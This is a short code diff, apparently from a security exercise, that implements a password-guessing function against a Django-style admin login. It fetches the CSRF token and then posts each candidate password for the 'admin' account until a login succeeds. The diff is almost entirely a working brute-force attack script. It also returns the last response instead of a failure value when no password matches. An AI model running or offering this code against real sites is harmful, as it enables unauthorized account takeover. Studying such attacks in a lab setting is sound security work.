@@ -16,7 +16,15 @@ def isloggedin(response):
 
 
 def test_password(address, candidates):
-	return None
+	s = requests.Session()
+	r = s.get(address + '/admin/login/?next=/admin/')
+	token = extract_token(r)
+	for pw in candidates:
+		login_data = dict(username='admin', password=pw, csrfmiddlewaretoken=token)
+		r = s.post(address + '/admin/login/?next=/admin/', data=login_data, headers=dict(Referer=address + '/admin/login/?next=/admin/'))
+		if (isloggedin(r)):
+			return pw
+	return r
 
 
 
